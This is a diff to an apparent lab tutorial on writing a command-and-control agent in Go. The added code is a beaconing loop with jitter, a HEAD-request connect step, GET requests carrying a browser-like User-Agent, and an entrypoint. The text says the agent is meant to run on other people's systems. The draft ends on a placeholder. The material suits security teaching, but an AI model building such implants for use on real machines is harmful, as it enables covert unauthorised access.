@@ -227,8 +227,161 @@ place in the "default" case. In other words, all the main operational logic of o
 First, we'll calculate `sleepTime` as the return value from a helper method we've not created yet called `CalculateSleepWithJitter()`.
 We'll discuss that later.
 
-We'll then connet by calling a Connect(), which also does not exist yet. Ditto for resind a requesrt
+We'll then connet by calling a Connect(), which also does not exist yet. Ditto for sending a request using SendRequest().
 
+For our response we use the library function `io.ReadAll()`, which can take body of the HTTP response (`resp`), and
+functionally convert it from an open stream into a byte slice (`[]byte`) we can work with in Go. We then also call
+Close() on it to terminate the stream and release all resources associated with it. 
+
+Once we're done with that we'll sleep, before repeating the whole loop again.
+
+Let's now go build out all the functions we referenced here, but which don't yet exist.
+
+### Connect() and GetTargetAddress()
+
+```go
+func (a *Agent) Connect() error {
+	url := fmt.Sprintf("http://%s/", a.GetTargetAddress())
+
+	req, err := http.NewRequest("HEAD", url, nil)
+	if err != nil {
+		return fmt.Errorf("failed to create request: %v", err)
+	}
+
+	resp, err := a.client.Do(req)
+	if err != nil {
+		return fmt.Errorf("connection failed: %v", err)
+	}
+	defer resp.Body.Close()
+
+	a.connected = true
+	return nil
+}
+```
+
+We construct the `url` using another helper function `GetTargetAddress()`, we've also yet to create. Here we simply use a 
+lightweight HEAD request as a means to force the underlying network stack to establish a TCP connection (if needed).
+
+
+Let's also take care of our new helper function, which aims to simply make our lives easier by combining our target's IP and
+port. But why bother? We'll instead of having to use fmt.Sprintf numerous times each time we need to combine them, we can
+just create this function, and call on it to abstract all that away. It's just a bit of tidying, but nothing essential
+obviously. 
+
+```go
+func (a *Agent) GetTargetAddress() string {
+	return fmt.Sprintf("%s:%s", a.Config.TargetHost, a.Config.TargetPort)
+}
+```
+
+### SendRequest
+
+After we've ensured we're connected we'll send a request:
+
+```go
+func (a *Agent) SendRequest(endpoint string) (*http.Response, error) {
+	// Check if we're connected
+	if !a.connected {
+		return nil, fmt.Errorf("not connected to server")
+	}
+
+	// Create the full URL
+	url := fmt.Sprintf("http://%s%s", a.GetTargetAddress(), endpoint)
+
+	// Create the request
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create request: %v", err)
+	}
+
+	// Add basic headers
+	req.Header.Set("User-Agent", "Mozilla/5.0")
+
+	// Send the request
+	resp, err := a.client.Do(req)
+	if err != nil {
+		a.connected = false 
+		return nil, fmt.Errorf("request failed: %v", err)
+	}
+
+	return resp, nil
+}
+```
+
+Everything should be well explained by the accompanying comments, just note as well our ability to manually
+set our HTTP Headers. In this case we've set `User-Agent`, just to illustrate, but this ability will come in use
+in our next lab.
+
+### CalculateSleepWithJitter()
+
+We now get to our final helper function, which will calculate our sleep time as a product of sleep and jitter each time
+it's called. 
+
+```go
+func (a *Agent) CalculateSleepWithJitter() time.Duration {
+	// Apply jitter as a percentage of the base sleep time
+	jitterFactor := 1.0 + (rand.Float64() * a.Config.Jitter / 100.0)
+	return time.Duration(float64(a.Config.Sleep) * jitterFactor)
+}
+```
+
+We now have our agent's config and operational logic in place, the only thing left to do now is
+create our agent's main entrypoint to orchestrate its execution.
+
+
+## cmd/agent/main.go
+
+```go
+package main
+
+import (
+		// imports here 
+)
+
+func main() {
+	// Set up signal handling for graceful shutdown
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+
+	// Initialize configuration with defaults
+	agentConfig := config.NewConfig()
+
+	// Create agent instance
+	c2Agent := agent.NewAgent(agentConfig)
+
+	// Start agent
+	err := c2Agent.Start()
+	if err != nil {
+		fmt.Printf("Failed to start agent: %v\n", err)
+		os.Exit(1)
+	}
+
+	fmt.Println("Agent started!")
+	fmt.Printf("Connected to: %s\n", c2Agent.GetTargetAddress())
+
+	// Wait for termination signal
+	<-sigChan
+
+	// Gracefully stop the agent
+	fmt.Println("Shutting down agent...")
+	c2Agent.Stop()
+
+}
+```
+
+Right at the top we'll set up signal handling to allow for graceful shutdown. Now of course in actual practice we 
+would not need this since an agent is running on someone else's system to which we don't have access to. 
+This is really just to help us now while developing to give us an ability to stop our agent gracefully.
+
+We'll then initialize our `Config` struct by calling the constructor. This allows us to then create our actual agent
+by calling its constructor, passing the config as an argument.
+
+We then `Start()` our agent, after which we wait for the termination signal (`SIGTERM`). Once called it will unblock
+the main thread, causing the Stop() function to be called on the agent.
+
+## Test 
+
+- RUN SERVER AND AGENT SHOW OUTPUT.
 
 
 
